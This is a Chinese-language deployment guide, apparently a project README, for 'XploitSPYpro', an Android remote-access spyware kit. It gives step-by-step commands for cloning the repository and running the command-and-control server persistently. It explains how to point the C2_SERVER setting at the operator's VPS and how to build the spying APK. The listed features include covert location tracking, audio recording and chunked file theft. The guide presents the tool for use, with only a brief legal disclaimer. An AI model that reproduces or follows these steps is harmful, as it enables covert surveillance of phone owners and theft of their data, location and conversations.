# XploitSPYpro 2026 版本 安装部署说明

---

## 版本说明

本版本适配了 2026 年 Android 14（API 34）新特性与权限模型，更新了 Android 客户端源码和服务端组件。支持新版小米 MIUI 系统改动。

---

## 环境准备

- Linux 服务器推荐 Ubuntu 22.04 或以上版本
- Node.js 建议使用 16.x 版本
- Java 11 JDK，用于 apktool 支持
- 最新 Android Studio 或 Gradle 8 以上

---

## 服务端部署

1. 克隆项目

```bash
git clone https://github.com/dg49888safe/XploitSPYpro.git XploitSPYpro-master
cd XploitSPYpro-master
```

2. 安装 Node.js 依赖

```bash
npm install
cd server
npm install
```

3. 修改默认管理员密码

- 编辑 `server/maindb.json`
- 替换 `password` 字段为新密码 MD5

4. 修改监听端口（可选）

- 编辑 `server/includes/const.js` 将 `exports.web_port` 改为 8080 以上端口，避免端口权限问题

5. 启动服务

```bash
PORT=8080 node server/index.js
```

推荐使用 pm2 守护进程

```bash
npm install -g pm2
pm2 start server/index.js --name xploitspy
pm2 save
pm2 startup systemd
```

6. 配置防火墙开放端口 8080

---

## 客户端 Android APK 编译

1. 安装 Android Studio，确保使用 Gradle 8+ 和 SDK 34

2. 导入 `client/app` 项目

3. 修改 `client/app/src/main/java/com/remote/app/Config.java` 中 `C2_SERVER` 为你的 VPS 公网 IP 或域名

4. 构建 Release APK

```bash
./gradlew assembleRelease
```

5. 生成 APK 位于 `client/app/build/outputs/apk/release/app-release.apk`

---

## 特色说明

- 支持 Android 14 前台服务新权限申请
- 支持动态权限管理，兼容 MIUI 系统特殊限制
- 支持 Socket.IO 通信断线重连
- 支持文件下载分块传输，兼容大文件
- 增强定位和录音权限及行为兼容性

---

## 注意事项

- 本项目法律风险高，禁止违规使用
- 部署前请确认修改默认密码和服务端地址
- 生产环境强烈建议配置 Nginx 反向代理和 HTTPS
- 小米 MIUI 系统权限限制需在设备端手动放行

---

## 常见问题

- 端口权限问题请使用非 80 端口
- 录音权限失败检查系统录音权限提醒
- 定位不准确或失败，确认系统定位和后台权限

---

更新日期：2026年6月
维护者：XploitWizer

